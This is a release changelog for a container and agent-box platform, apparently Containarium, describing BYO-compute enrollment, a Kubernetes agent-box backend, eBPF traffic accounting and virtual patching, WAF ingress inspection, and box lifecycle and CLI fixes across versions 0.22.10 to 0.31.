  as REST/grpc-gateway only — like the managed cloud, where native gRPC over
  :443 returns `403 text/html`. An `http(s)://` control-plane address selects
  the REST transport, which speaks the same actuation RPCs over their gateway
  mappings (`POST /v1/actuation/{heartbeat,status,enroll}`) and carries the host
  bearer as the `Grpc-Metadata-Host-Bearer` header. Without this, a BYO-compute
  host enrolled against a REST-only control plane could not heartbeat or report
  its capability — so its capacity showed "unknown" in the operator view and the
  host-sweeper treated it as stranded. `WatchAssignments` (server-streaming) is
  gRPC-only; a BYOC host on a REST control plane is push-driven (the cloud drives
  it via the sentinel peer-proxy), so REST mode runs heartbeat + status only and
  skips the assignment-watch loop. (#722)

## [0.31.1] - 2026-06-17

### Added

- **`containarium cloud enroll` mints + sends a BYOC driver token.** The
  self-service BYO-compute flow now hands the cloud everything it needs to place
  tenant workloads on this host: the host mints an admin JWT with its OWN
  `/etc/containarium/jwt.secret` (`--jwt-secret-file`, default
  `/etc/containarium/jwt.secret`) and sends it as `EnrollHostRequest.driver_token`,
  plus its `pool join` spot-id as `oss_backend_id` (`--oss-backend-id`). The
  cloud seals the token and replays it to drive this host through the sentinel
  peer-proxy. Best-effort: an unreadable secret warns and enrolls without a
  token (`--no-driver-token` to skip); the token is short-lived (re-run to
  rotate). Companion to Containarium-cloud's BYOC stack. (cloud #554)

## [0.31.0] - 2026-06-17

An experimental **Kubernetes backend**: run an agent box as a pod in a cluster
you already operate, reached over SSH exactly like an LXC box — same `agent-box`
stdio MCP contract, no kube-apiserver token in the agent's hands. Gated behind
the `k8s` build tag, so the default daemon is unchanged.

### Added

- **Experimental Kubernetes backend (`//go:build k8s`).** Run an agent box as a
  pod in a Kubernetes cluster you operate, reached over SSH exactly like an LXC
  box — same `agent-box` stdio MCP contract, no kube-apiserver token in the
  agent's hands. The daemon reconciles a per-tenant namespace + StatefulSet +
  headless Service + default-deny NetworkPolicy, runs the box as a non-root,
  drop-ALL, seccomp-`RuntimeDefault` (`restricted` Pod Security) pod, and
  programs the sshpiper gateway (the `Pipe` CRD) so `ssh <tenant>@<gateway>`
  routes to the right box. Both SSH hops are key-authenticated (client→gateway
  by the agent's key, gateway→box by an upstream key) and the box's host keys
  are pinned via `known_hosts_data`. `client-go` is isolated behind the `k8s`
  build tag, so the default daemon links none of it. Ships the
  `ghcr.io/footprintai/containarium-agent-box` image (rootless dropbear +
  agent-box) plus `deploy/k8s/sshpiper/` manifests + runbook. Validated
  end-to-end on `kind`. See `docs/K8S-AGENT-BOX-RUNTIME-DESIGN.md`. (#704–#715)

## [0.30.0] - 2026-06-16

BYO-compute, end to end: an enrolled host now reports itself to the cloud, so
it shows up live in the cloud fleet view with real specs + health. The OSS half
of the host→cloud report path (pairs with Containarium-cloud's actuation RPCs).

### Added

- **`containarium cloud enroll`.** Self-service host enrollment for BYO-compute:
  redeems a single-use join token against the control plane (`EnrollHost`),
  registers the host, and writes `~/.containarium/cloud.yaml`. Distinct from the
  sysadmin `cloud login` flow — the token from the cloud's "Add compute"
  one-liner doubles as the host's durable bearer. (#694)
- **Actuation status-report loop.** When enrolled, the daemon's actuation client
  periodically reports its self-measured capability profile + `doctor`
  self-check to the cloud (`ReportHostStatus`), so the fleet view shows live
  CONNECTED/DEGRADED status. The profile covers agent version, CPU cores,
  total/available RAM (`/proc/meminfo`), disk (`statfs`), and GPU (count +
  `nvidia-smi` model). (#694, #697)
- **`doctor` self-check in the report.** The capability checks (running-as-root,
  caps, writable paths, live `useradd` probe) were extracted to a shared
  `internal/hostcheck` package so the daemon's report includes them — surfacing
  a capability-trapped host as DEGRADED in the fleet view, not just at first
  container create. (#695)

## [0.29.0] - 2026-06-15

Per-tenant BYO-compute: turn your own spare hosts into a pool and schedule your
own workloads across them — no cross-tenant sharing, data stays on your hosts.

### Added

- **`containarium pool` commands.** `pool list` (pool members + health),
  `pool join` (turnkey one-command host onboarding — writes the canonical
  hardened daemon unit + a `--pool` drop-in + the tunnel unit and starts them;
  idempotent, root-gated, `--dry-run`), and `pool leave` (stop the tunnel /
  deregister from the sentinel, remove the pool config, return the daemon to
  standalone). Replaces the manual `install-lab-*.sh` ritual. (#690, #692)
- **`containarium doctor` capability self-check.** The deploy-contract preflight
  that catches the "capability trap" — a systemd unit that looks fine but whose
  caps/`ReadWritePaths` silently break `useradd`, so the daemon only fails on the
  first container create. Checks uid, effective caps, writable paths (incl.
  `/var/log`), and a live `useradd`/`userdel` probe. Runs at daemon startup
  (loud, non-fatal warning) and gates `pool join`. (#691)
- **Backend capacity primitives.** Advertise/withdraw a backend's spare
  scheduling headroom, a capability profile + micro-benchmark recorded at join,
  a bounded graceful drain when headroom is withdrawn, and a signed
  self-measurement emitted on a heartbeat for control-plane integrity. (#684)

### Changed

- Dependency bumps: `actions/setup-node` 4→6; `golang.org/x/{term,sys,crypto}`;
  `google.golang.org/api`. (#685–#689)

## [0.28.0] - 2026-06-14

Multi-GPU passthrough per container, and **target-aware clients** — the MCP and
CLI now distinguish the hosted control plane from a self-hosted daemon and
refuse host-level operations client-side instead of round-tripping to an opaque
error.

### Added

- **Multi-GPU passthrough per container.** A container can now be created with more than one GPU attached. `containarium create` takes a repeatable/comma-separated `--gpu` flag (`--gpu 0 --gpu 1` or `--gpu 0,1`), each entry an index or PCI address; every device is resolved to a stable PCI address at create time (same kernel-upgrade-safe pinning as the single-GPU path) and attached as a distinct Incus device (`gpu`, `gpu1`, `gpu2`, …). A GPU requested twice (same resolved PCI) is rejected. The proto contract gains `repeated string gpus` on `CreateContainerRequest`/`ResourceLimits` and `repeated string gpu_devices` on `Container`. The single-GPU device name stays `gpu`, so existing single-GPU containers are byte-identical. Surfaced through the gRPC + HTTP clients, and the platform MCP `create_container` tool gains a `gpus` array argument. Read-back (`list`/`get`) reports all attached GPUs (`gpu_devices`), sorted for stable output. (#673)
- **Target-classified MCP backend.** The platform MCP picks its backend from the credential: a hosted-control-plane API token (`ctnr_…`) selects a cloud backend where host-level tools (`get_system_info`, `check_for_updates`, `upgrade_backend`, `debug_container`) report a clear "not available on the hosted control plane" client-side instead of an opaque error; a JWT / daemon credential keeps the full surface. (#676)
- **Target-aware CLI host-level commands.** `info` (system info), `debug`, `backends upgrade`, and `backends versions` refuse client-side with a clear message when pointed at the hosted control plane, mirroring the MCP. The classifier (`ctnr_` token prefix, or the cached per-server access model) is shared via `credentials.IsCloudToken`. Local and self-hosted-daemon targets are unaffected. (#678)

### Changed

- **Dropped the deprecated singular `gpu` request field.** The server now reads only the repeated `gpus`; a client sending only the old singular `gpu` no longer gets GPU passthrough (`gpus` is the only supported shape). This also fixes a latent bug where a multi-GPU create routed to a peer backend silently lost its GPUs. (#677)

## [0.27.0] - 2026-06-13

eBPF virtual patching (Tier 1) + the agent-skills Phase 4 box-assembly fixes
that make the in-box loop provision end-to-end.

### Added

- **eBPF virtual patching — Tier 3 PR-3 (coraza-caddy ingress WAF).** Optional WAF-grade inspection of north-south HTTP ingress via the [Coraza](https://github.com/corazawaf/coraza) WAF as a Caddy plugin — running the OWASP CRS where Caddy has already terminated TLS and parsed the request (the cases the in-kernel tiers can't reach: TLS, multi-segment, vendor rule sets). The custom Caddy build gains `--with github.com/corazawaf/coraza-caddy/v2` **only when WAF is opted into** (the daemon's own dependency surface is untouched — Coraza lives in the Caddy build, not the daemon's `go.mod`), and a `waf` handler is prepended to ingress routes' handler chains so it inspects before `reverse_proxy`. **Off by default** (`CONTAINARIUM_WAF_INGRESS=1`); `SecRuleEngine` runs in `DetectionOnly` (observe + log) unless `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` arms blocking — and with WAF off, programmed routes are byte-identical to before. Covers **ingress only** — east-west (container↔container) is the standalone TPROXY proxy's job (#667). The custom-Caddy build + deploy + Log4Shell validation are operator steps; pure-Go layers (build-arg gating, handler JSON, route injection) are unit-tested. Design + runbook: `docs/security/VIRTUAL-PATCHING-TIER3-INGRESS-WAF.md`, engine choice in `TIER3-WAF-ENGINE-DECISION.md`. #662 (epic #659).
- **eBPF virtual patching — Tier 3 PR-2 (userspace inspection seam).** The steering proxy now inspects steered connections before forwarding: a pluggable `Inspector` reads and **reassembles the request head across TCP segments**, and — armed — returns a `403` instead of forwarding the exploit (observe-only otherwise; both audit `network_policy.waf_block` naming the matched rule). The reference `BuiltinInspector` substring-matches the curated cleartext signatures over the reassembled head — already beyond Tier 2's reach (the in-kernel scan only ever sees a single packet, so a signature split across segments evades it), with **no new dependency**. A real WAF engine (Coraza + the OWASP CRS) is a drop-in behind the same `Inspector` interface, deliberately deferred so adding it to the dependency surface is an explicit decision (likely a `waf` build tag). Enabled with `CONTAINARIUM_WAF_INSPECT=1` on top of `CONTAINARIUM_WAF_TPROXY_ADDR`; blocks only when `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` (same arm as the kernel tiers). Design: `docs/security/VIRTUAL-PATCHING-TIER3.md`. #662 (epic #659).
- **eBPF virtual patching — Tier 3 PR-1 (WAF steering skeleton).** Groundwork for the userspace-WAF tier (#662): a transparent steering proxy (`internal/waf`) that accepts TPROXY-steered connections, recovers each one's original destination (via an `IP_TRANSPARENT` listener — the kernel sets the accepted socket's local address to the original dst), and forwards bytes both ways. **Forward-only — no WAF inspection yet** (Coraza lands in PR-2); this PR de-risks the steer→recover→forward path. Off by default (only starts when `CONTAINARIUM_WAF_TPROXY_ADDR` is set, and steering needs an operator-applied nft TPROXY rule — see `experimental/waf/validate-tproxy-steering.sh`, which validates the whole path inside a throwaway network namespace so it never touches a live host's networking). Linux-only at runtime (compiles everywhere; the bind errors off-Linux). Backend capability already confirmed (kernel 6.8: `nft_tproxy` + `bpf_sk_assign` present, daemon has `CAP_NET_ADMIN`). Design: `docs/security/VIRTUAL-PATCHING-TIER3.md`. #662 (epic #659).
- **Auto-quarantine on malware detection (scanner → virtual-patch).** When the ClamAV scanner finds malware in a container, the daemon adds a deny-all-egress rule to that container's tenant — a network quarantine that stops a compromised container exfiltrating or calling out — and releases it automatically when the container next scans clean. Off by default (`CONTAINARIUM_SECURITY_AUTO_QUARANTINE=1`); the quarantine only *drops* traffic when the network-policy BPF enforcer is also armed (it's recorded as a deny rule either way). Safe against operator rules (the quarantine rule is note-marked; release removes only it, never an operator's own `0.0.0.0/0` deny) and self-healing (a 24h expiry backstop, refreshed each infected scan). This is the honest realization of the virtual-patching epic's "scanner → virtual-patch" capstone (#659): ClamAV's infected/clean verdict maps cleanly onto the Tier 1 deny rules, whereas Trivy package CVEs (a vulnerability *inside* a container, with no network endpoint to block) are deliberately **not** wired — see `docs/security/AUTO-QUARANTINE.md`. Caveat: deny rules are per-tenant, so quarantine blocks all of a tenant's containers' egress (containment over availability). #659.
- **eBPF virtual patching — Tier 2 (cleartext exploit-signature scanning).** The eBPF program now scans the **inbound** payload of a container's TCP connections (the veth TC_EGRESS / container-receive direction) for a curated set of cleartext exploit signatures — Log4Shell `${jndi:`, Shellshock `() {`, Spring4Shell, path-traversal, `/etc/passwd` — and drops the packet before it reaches a vulnerable service, the WAF/IPS form of virtual patching. In-kernel scan via a single `bpf_loop` over a `(signature × offset)` space with a per-CPU scratch buffer and tiered constant-size payload loads (the verifier-feasible shape, validated on a Linux backend at kernel 6.8). Matches audit as `network_policy.signature_match` (naming the matched signature) and only **drop** under enforce mode; the per-packet scan cost is gated so it runs only when enabled. **Three independent opt-ins:** `CONTAINARIUM_NETWORK_POLICY_BPF_OBJECT` (load), `CONTAINARIUM_NETWORK_POLICY_SIGNATURES=1` (scan), `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` (drop). **Best-effort by construction, not a WAF:** single packet (no TCP reassembly → segment-split evasion), cleartext only (TLS is opaque), first 256 payload bytes only — the WAF-grade path is Tier 3 (#662). Operators can also manage their own **global signatures** with `containarium network-policy signature add/rm/list` (e.g. `signature add CVE-2024-1234 --pattern '<bytes>'`) — fleet-wide patterns that augment the built-in set, persisted (`network_policy_signatures` table) and picked up on the reconcile loop; each gets a stable id in a reserved range so an audit match unambiguously names its source. Design + runbook: `docs/security/VIRTUAL-PATCHING-TIER2.md`. #661 (epic #659).
- **eBPF virtual patching — Tier 1 (L3/L4 deny rules).** A network policy can now carry **deny rules** that block a tenant's egress to a destination CIDR (optionally scoped to a port/proto) **before** the egress allow-list is consulted — deny beats allow, the same way the cloud-metadata IP does. This "virtually patches" a known-vulnerable destination in-kernel, with zero downtime, until the real upstream fix ships; an optional `expires_at` makes the rule self-remove once the fix lands. Manage them with `containarium network-policy patch add/rm/list` (e.g. `patch add <tenant> --cidr 1.2.3.4/32 --port 6379 --proto tcp --note CVE-… --expires 2026-07-01T00:00:00Z`); `list` shows a `PATCHES` column. Deny rules are persisted alongside the allow-policy (a `deny_rules` JSONB column) and mutated atomically server-side, so concurrent edits can't lose updates and `network-policy set` (which manages only the allow-policy) preserves them without a client round-trip. Denied flows audit as `network_policy.virtual_patch`, and — like the rest of the policy — only **drop** when enforcement is armed (`CONTAINARIUM_NETWORK_POLICY_ENFORCE=1`); otherwise they are observed and audited. Off entirely unless `CONTAINARIUM_NETWORK_POLICY_BPF_OBJECT` is set. There is at most one deny rule per `(tenant, CIDR)` — the kernel `deny_cidr` LPM map is keyed by CIDR, so block a whole host with `--port 0` (any). Kernel verifier acceptance of the new map + deny-first branch validated on a Linux backend (kernel 6.8, TCX); the end-to-end armed-drop path rides the normal backend upgrade cycle. Design + runbook: `docs/security/VIRTUAL-PATCHING-DESIGN.md`. First tier of the virtual-patching epic (#659); #660. Tiers 2–3 (cleartext signature match, userspace WAF steering) are designed (#661, #662).

### Fixed

- **Agent-skill boxes now assemble the in-box loop.** The `agent-runtime` recipe's `post_start` pulls `install-agent-runtime.sh` + the `agent-box`/`agent-runtime-bundle` artifacts from `…/<release>/…`, where `<release>` is the param the daemon passes — `version.GetVersion()`. But that's the **bare** semver (`0.26.6`; the release workflow builds with `VERSION=${tag#v}`), while the git tag/release is `v`-prefixed (`v0.26.6`), so every URL 404'd and the best-effort assembly silently skipped — agent boxes came up without `agent-runtime`/`agent-box`, and `agent run` fell back to an empty artifact regardless of provider key. The daemon now passes the `v`-prefixed tag (#668).
- **Agent-skill runs are now idempotent.** `provisionSkillBox` always went through the recipe deploy path, whose `CreateContainer` errors `already exists` on a box that's already provisioned — so any re-run (the normal `run → set key → run again` flow, or a crew re-driving its members) failed with `code=Internal`. An existing box is now reused (token re-minted, seed re-applied, policy re-applied; started first if stopped) (#669).
- **MCP container connection path is discoverable to agents** (#658, #663).

## [0.26.6] - 2026-06-12

Network-policy reconcile + egress fixes (hardening for eBPF traffic accounting).

### Fixed

- **Network-policy reconcile no longer hammers Incus.** The enforcer's reconcile loop did an `incus` inspect (`GetRawInstance`) for **every** container **every 10s** to resolve its veth — which could wedge `incusd` on busy or resource-constrained hosts (observed taking down container listing on a host running ~38 containers). Reconcile now caches the container→veth mapping and resolves the ifindex with a cheap local netlink lookup, re-inspecting only when a container starts/restarts (#654, #655).
- **Creating a network policy with no egress domains no longer 500s.** `egress_cidrs`/`egress_domains` are `TEXT[] NOT NULL`; a nil slice was encoded as SQL `NULL` and violated the constraint, so a domains-less policy (e.g. `--mode log_only --egress-cidr 0.0.0.0/0`) failed with SQLSTATE 23502. Nil arrays are now coerced to `'{}'` (#653).
- **Idle-flow reaper:** guarded the `int64`→`uint64` casts (gosec G115) in the #632 reaper path (#656).

## [0.26.5] - 2026-06-12

eBPF traffic history + signed external catalogs.

### Added

- **eBPF traffic-flow accounting completed (traffic-view follow-ups).** The eBPF per-flow path now captures the **reply direction** via a second veth-egress hook, so the traffic view shows `bytes_received`/`packets_received`, not just sent (#631). Closed flows are **persisted to history** by an idle-age reaper — a flow with no packets for `flowIdleTimeout` (2 min) is written to `traffic_connections` and forgotten — so `containarium traffic history` and aggregates light up on docker-in-LXC backends where conntrack attribution fails, without waiting for LRU eviction (#632). Where both conntrack and eBPF observe a flow, **cross-source dedup** keeps a single logical history row per container so byte sums don't double-count (#643). Gated behind `CONTAINARIUM_NETWORK_POLICY_BPF_OBJECT` (off by default). Hardware-validated on a Linux backend (kernel 6.8, TCX).
- **Optional signed external skill/crew catalogs.** An opt-in provenance check on `Manager.LoadDir`: with `CONTAINARIUM_CATALOG_REQUIRE_SIGNED=1` and `CONTAINARIUM_CATALOG_TRUSTED_PUBKEYS` pointing at a trusted-key file, each external `*.yaml` catalog must carry a valid detached ed25519 signature (`foo.yaml.sig`) before it's merged; a missing or bad signature fails that load. Off by default (self-authored catalogs load unsigned, as before) and offline-verifiable for air-gapped installs (#648).

### Fixed

- **deploy-binary:** systemd unit names are now parameterized and the empty-`PEERS` unbound-variable error is fixed (#647).

## [0.26.4] - 2026-06-10

Traffic CLI + login UX fixes.

### Added

- **`containarium traffic` CLI** — `connections`, `summary`, and `history` subcommands over the platform daemon's TrafficService (the same data the webui traffic view shows, now scriptable). Supports `--format table|json` and the usual `--protocol`/`--dest-ip`/`--limit` filters; resolves the server + token from your login like `ssh`/`connect`. (#640)

### Changed

- **Cloud uses the API token for box access; no SSH-key prompt.** On the hosted cloud, box access is via the login token (`containarium connect`), so login no longer offers to register a personal SSH key. Self-hosted (OSS) keeps the SSH-key flow. The access model is learned per server (preferring a server-declared signal, falling back to a host heuristic) and cached in the credentials file. `--with-ssh-setup` still forces key registration. (#637, #638)

### Fixed

- **`containarium login` no longer fails with "device_name must be 1-64 chars".** The auto-generated device name (`<user>@<host>`) contained `@`, outside the cloud's allowed charset, so every default login 400'd; the default is now sanitized to the allowed set and clamped to 64 chars. An explicit `--device-name` is unchanged. (#634)
- **Login shows your real identity instead of "unknown user."** The user email is recovered from the access token's JWT claims (the CLI-session response doesn't carry it) and persisted for `whoami`. (#636)
- **A re-registered SSH key on repeat login is reported as success, not a 409 warning.** (#636)

## [0.26.3] - 2026-06-10

eBPF-sourced network usage.

### Added

- **Per-container network usage (src/dst IP + bytes) from eBPF.** Network traffic is now sourced from a per-veth eBPF program, giving accurate per-container ingress/egress byte accounting with source/destination IPs. (#628)
- **Release binaries embed the compiled BPF object.** The eBPF object is embedded at build time, so release binaries ship it directly — no clang/BPF toolchain required on the backend host to run the traffic collector. (#629)

## [0.26.2] - 2026-06-09

Native Windows CLI client.

### Added

- **Windows (`windows/amd64`) CLI build + release artifact** (`containarium-windows-amd64.exe`). Windows users can now run the `containarium` CLI natively instead of only via WSL. The binary is **client-only**: the `daemon`/`sentinel`/`tunnel` subcommands and the direct-DB / host-admin commands (which depend on Linux facilities — incus/LXC, eBPF, netlink, iptables) are gated `//go:build !windows`, so the Windows binary exposes the remote-client commands (`create`/`list`/`ssh`/`info`/`connect`/…) that talk to a daemon over gRPC/HTTP. linux/macOS builds are unchanged (full binary, daemon included). (#624)

## [0.26.1] - 2026-06-09

Wake-on-SSH fix. The v0.26.0 implementation never fired in the real
topology; this reworks it to the correct design.

### Fixed

- **Wake-on-SSH now actually wakes a slept box.** In v0.26.0 the wake was a sentinel-side proxy that probed sshpiper's upstream to decide whether to wake — but that upstream is an always-on backend SSH router (not the box's sshd), so the probe always succeeded and the wake never fired (#593). The wake now lives in the daemon-local SSH router (`containarium-shell`) where the box identity, state, and start capability already are: a non-running box is started, its `last_started_at`/`stopped_at` bookkeeping is stamped (autosleep anti-thrash + two-phase-reaping reset), and the session waits (bounded) for the box to be ready before proceeding. The v0.26.0 sentinel/daemon machinery (the `ssh-wake-proxy` subcommand, keysync wake-port routing, the daemon `/ssh-wake` endpoint, and the sentinel systemd unit) is removed — sentinels need no changes for wake-on-SSH, which also removes an SSH-path upgrade hazard. (#539, #593)

## [0.26.0] - 2026-06-09

Transparent wake-on-SSH, plus the first request-rate observability plane.
`ssh` to an auto-slept box now starts it on the inbound connection — parity
with wake-on-HTTP — and a new metrics plane surfaces per-container request
rate and egress fan-out, with alerting on crawler-style abuse. Release
binaries now stamp their version from the git tag.

### Added

- **Wake-on-SSH** — an inbound SSH connection to an auto-slept box now transparently starts it, waits for sshd to be dial-ready, then proxies through, exactly like wake-on-HTTP. SSH reaches a box via the external sshpiper, which has no per-connection pre-dial hook, so the interception is a thin sentinel-side wake-proxy (`containarium ssh-wake-proxy`, its own systemd unit) that sshpiper routes upstream through — sshpiper's `authorized_keys` auth and per-user routing stay untouched. The daemon gains `WakeForSSH` and an HMAC-gated `POST /ssh-wake` (same sentinel channel as `/authorized-keys`). Idle-clock reset and the anti-thrash window are inherited from the existing start path. (#539)
- **Request-rate metrics plane (slice 1)** — design + first slice of a per-container request-rate observability plane. (#231)
- **Egress fan-out detection** — a metric flagging crawler-style egress fan-out (an abuse signal), plus vmalert rules that alert on it. (#553, #554)
- **Per-container metrics labeled with `cloud_container_id`** — per-container metrics now carry the cloud container UUID label so the control plane's queries can join on it. (#550, #231)

### Fixed

- **Release binaries stamp the tag version** — `make build-release` injects the version from the git tag via ldflags, so a released binary reports its real version instead of a possibly-stale committed constant; `version.go`'s value is now just the dev-build fallback. (#549)

## [0.25.0] - 2026-06-08

Fleet hygiene + delete protection. `containarium prune` bulk-cleans leaked
boxes; first-class `protect`/`unprotect` verbs (and a `SetContainerDeletePolicy`
RPC) keep a persistent runner from being swept by an automated reap; and the
container read API now surfaces the full idle→stop→delete lifecycle. The `ttl`
verbs finally reach the daemon, closing the failed-CI debug-box leak.

### Added

- **`containarium prune`** — bulk-delete containers matching a filter, for fleet cleanup (reaping piles of leaked/finished ephemeral boxes one command instead of one-by-one). Filters combine with AND: `--state running|stopped`, `--name-contains`, `--older-than <dur>`, `--label key=value` (repeatable). Safeguards: at least one filter required (no accidental delete-all), core platform containers are never eligible, the matching set is listed before anything happens, and deletion needs confirmation (`--yes` to skip, `--dry-run` to preview). Composes the existing list + delete surface, so it works against the OSS daemon and Containarium Cloud alike. (cloud #264)
- **`Container.stopped_at` + `Container.delete_after_stopped_seconds`** — the container read API (`GetContainer`/`ListContainers`) now reports the two-phase reaping status (#525) alongside `ttl_expires_at` and `auto_sleep_enabled`, so a reader sees the *full* lifecycle (where a box is in idle→stop→delete) without host access. Read from the Incus config the daemon stamps; `stopped_at` is omitted while the box runs. Completes the read-side of the box-lifecycle model for the fleet-hygiene view (cloud #264). (#525)
- **Delete-policy protection for `--podman`/runner boxes** — a box marked `user.containarium.delete_policy=protected` is now skipped by every automated/bulk deletion path: the `ttlsweeper` auto-reap and `containarium prune`. So a "clean up leaked boxes" sweep can no longer take out a persistent, registered runner; removing a protected box takes a deliberate single-box `containarium delete`. (cloud #284)
- **`containarium protect` / `containarium unprotect`** — first-class CLI verbs to set/clear that delete protection, replacing the manual `incus config set <box> user.containarium.delete_policy protected` workaround. Backed by a new `SetContainerDeletePolicy` RPC (`POST /v1/containers/{name}/delete-policy`) and a `delete_policy` enum field on the `Container` message, so the policy is settable via gRPC/REST/MCP and surfaced on every list/get read path — not just inspectable on the host. A daemon too old to implement the RPC degrades to a friendly no-op (gRPC `Unimplemented` / HTTP 404). (cloud #284)
- **Metrics attribution carries `cloud_container_id`** — the OTLP collector's `container_ips.json` source-IP map now records each box's cloud container UUID alongside the local name, so when the `source.ip → container.id` join lands it can stamp the label the cloud control plane's metrics queries select on (rather than only the local container name). (cloud #231/#264-A)

### Fixed

- **gRPC `ListContainers` now returns labels** — the gRPC client dropped the `labels` map when converting the response, so label-based filtering (e.g. `containarium prune --label`) saw no labels over gRPC. HTTP already carried them.
- **`containarium ttl set / get / unset` now reach the daemon** — the verbs were client-side stubs that returned a synthetic "not implemented" (and surfaced as HTTP 404 over REST), so the containarium-run *keep-on-failure* path never stamped a TTL and failed-CI debug boxes leaked until deleted by hand. `set`/`unset` now call the real `SetContainerTTL` RPC (unset = duration 0); `get` reads `ttl_expires_at` off `GetContainer`. A daemon too old to implement it still degrades to a friendly no-op (gRPC `Unimplemented` / HTTP 404 mapped to it). (cloud #264)
- **core-caddy survives recreate (stable IP)** — the `--app-hosting` edge container's IP was hard-coded into the split-horizon dnsmasq record (and a host DNAT rule) with no reconciler, so every core-caddy recreate stranded them and internal clients resolved platform hostnames to a dead IP. The daemon now assigns core-caddy a deterministic static IP high in the bridge subnet at creation, so a daemon-driven recreate reuses it and those references stay valid. (cloud #240)

### Dependencies

- Bump `github.com/jackc/pgx/v5` 5.9.2 → 5.10.0 and `google.golang.org/api` 0.282.0 → 0.283.0. (#537, #538)

## [0.24.0] - 2026-06-07

Box lifecycle: the full default-sleep → default-dead model (#522). Every box
can be born with a death date and a stop timer; idle boxes free CPU/RAM, then
disk, with no manual cleanup and without ever reaping a box someone is actively
debugging. Plus sentinel preemption/recovery alerting.

### Added

- **Sentinel preemption/recovery alerting** — the sentinel emits webhook
  notifications and a `/metrics` endpoint on backend preemption + recovery, so
  an outage is observable instead of silent. (#514)
- **Birth TTL — `containarium create --ttl <dur>`** — a box can be born with a
  death date. `CreateContainer` accepts an optional `ttl_seconds`; the daemon
  stamps `ttl_expires_at` atomically at create time (same persistence + 7-day
  cap as `ttl set`), so the `ttlsweeper` reaps the box even if the client dies
  the instant after create — no separate `ttl set` call to forget. Closes the
  leak window where an ephemeral/CI box runs forever because its TTL was never
  set. If the TTL can't be stamped the box is deleted rather than left to leak
  (default-dead). (#523)
- **Birth idle-stop — `containarium create --idle-stop <dur>`** — a box can be
  born with its auto-sleep (idle→stop) timer, not just its delete timer.
  `CreateContainer` accepts an optional `idle_stop_minutes`; the daemon enables
  auto-sleep at create with that idle threshold (same persistence as
  `toggle_auto_sleep`), so a crashed/cancelled job still releases CPU/RAM (disk
  kept, wakes on access) — no separate `toggle_auto_sleep` call to forget. The
  stop half of the default-sleep→default-dead model (birth TTL is the delete
  half). Off by default. (#524)
- **Two-phase reaping — `containarium create --delete-after-stopped <dur>`** —
  completes the lifecycle's second timer: a box left STOPPED past this window is
  auto-deleted (disk reclaim) after idle-stop already reclaimed CPU/RAM. The
  clock runs from the stop transition and RESETS when the box is woken, so a box
  you keep investigating is never reaped — only one left continuously stopped
  is. A **separate opt-in** from idle-stop/auto-sleep: a scale-to-zero box that
  merely sleeps is never deleted just for being stopped. `ttlsweeper.Decide` now
  deletes on either the absolute TTL or the stopped→delete window; the daemon
  stamps `stopped_at` on stop and clears it on start. Off by default. (#525)

### Fixed

- **Auto-sleep no longer stops a box with an active session.** The idle signal
  treated a long-lived open connection (e.g. an SSH/exec debug session) as
  last-active at its *start*, so a session open longer than the idle threshold
  looked idle and the box was slept mid-debug. An open connection now counts as
  active-as-of-now; the box stays awake while anyone is connected and becomes
  sleep-eligible only after the session closes. (#524)

## [0.23.2] - 2026-06-06

### Added

- **`ProxyRoute.container_name`** — `GetRoutes` now returns the container behind each route in a dedicated field instead of overloading `app_name` (the display name), so a multi-tenant control plane can key its route reconciler on the box identity. Additive; `app_name` unchanged. (#511)

### Fixed

- **Sentinel periodic recovery retry** — a backend that goes down is retried with backoff instead of being given up on after the first failed recovery attempt. (#515)
- **Spot VMs are private-by-default in sentinel mode** — `spot_vm_external_ip=false` so a spot backend no longer gets a public IP it doesn't need; the sentinel fronts it. (#518)

## [0.23.1] - 2026-06-06

### Fixed

- **GCP KMS backend re-reads its token file** — the access token is reloaded per request, so a sidecar-refreshed `CONTAINARIUM_GCP_KMS_TOKEN_FILE` is picked up without a daemon restart. (#509)

## [0.23.0] - 2026-06-06

Minor release: pluggable KMS envelope encryption (with an AWS backend and an admin API), shared CephFS volumes, off-host database backups, node-VM scaffolding, and release-drift visibility. Packages all `main` work since v0.22.10.

### Added

- **KMS envelope encryption for tenant secrets** — pluggable backends (`inproc` / `vault` / `gcp` / `aws`, via `CONTAINARIUM_KMS_BACKEND`) wrap a per-row Data Encryption Key under a KMS-resident Key Encryption Key; legacy rows migrate in place. Includes the **AWS KMS** backend (hand-rolled SigV4, no vendor SDK) and a **`KmsService`** admin API — `GetKMSStatus` / `GetEnvelopeCoverage` / `MigrateToEnvelope` — plus a `containarium kms` CLI and admin-scoped MCP tools. (#490, #504)
- **Shared multi-writer CephFS volumes** — proto-first `VolumeService` (create / list / delete / attach / detach), capability-gated on a `cephfs` storage pool (single-node ZFS hosts get a clear error). (#500)
- **Off-host database backups** — `containarium backup` runs `pg_dump` inside a tenant's container and stores the compressed dump on the host or in a GCS bucket (`BackupService` + CLI + MCP); restores verify the dump's SHA-256 first. (#495)
- **`containarium node`** — carve a host into GPU/CPU node-VMs (design + scaffold). (#502)
- **Compose secret/OTel delivery via `env_file`** — nested docker/compose apps don't inherit the LXC environment, so the daemon drops a dotenv file at a fixed path they reference via `env_file:`; the OTel-only env-file mechanism was generalized into a shared delivery seam. (#493, #494)
- **Release-drift visibility** — `GetLatestRelease` endpoints + a CLI update check + a webui Versions panel with per-backend "Upgrade now". (#498, #505)
- **In-container KMS broker design note** — `docs/security/KMS-BROKER-DESIGN.md`: brokering envelope encrypt/decrypt to tenant workloads without handing them the KEK. (#499)
- **System-wide GitHub-runner cap + reconcile controller.** (#489)

### Fixed

- **`ssh_host` is the source of truth for SSH** — the daemon's per-container `ssh_host` is authoritative; the MCP/CLI build the connect target (`user@ssh_host`) from it rather than reconstructing a host. (#503)
- **Login auto-disambiguates a colliding default device name** to avoid a stranded session. (#496)
- **`list_backends` decodes proto-JSON string-encoded int64.** (#501)

## [0.22.10] - 2026-06-04

Patch-release window (0.22.5 → 0.22.10): GitHub-runner provisioning hardening, jump-server multi-key sync, token-to-shell `connect`, and cloud route/actuation plumbing — plus the features that were pending after 0.22.0.

### Added

- **`containarium connect <box>`** — token-to-shell access with no SSH-key setup (+ MCP tool + Tier-2 sessions). (#466, #467)
- **Cloud-assigned container routes exposed at the host edge**, with disk + GPU wired into the cloud actuator's create path. (#463, #465, #469)
- **`RUNNER_DNS`** to pin the GitHub-runner box resolver. (#480)
